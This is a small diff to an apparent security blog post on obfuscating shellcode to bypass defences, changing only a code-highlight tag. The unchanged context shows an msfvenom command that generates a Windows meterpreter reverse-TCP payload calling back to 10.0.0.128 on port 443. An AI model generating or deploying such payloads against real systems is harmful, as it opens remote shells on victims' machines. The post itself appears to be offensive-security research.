@@ -10,7 +10,7 @@ In this blog entry, I'll be playing around with obfuscation techniques to bypass
 ### 1. Generating Shellcode
 To kickstart the research, I'll generate a basic meterpreter payload. This same payload will be used throughout the research.
 
-{% highlight %}
+{% highlight powershell %}
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.128 LPORT=443 -f c
 {% endhighlight %}
 
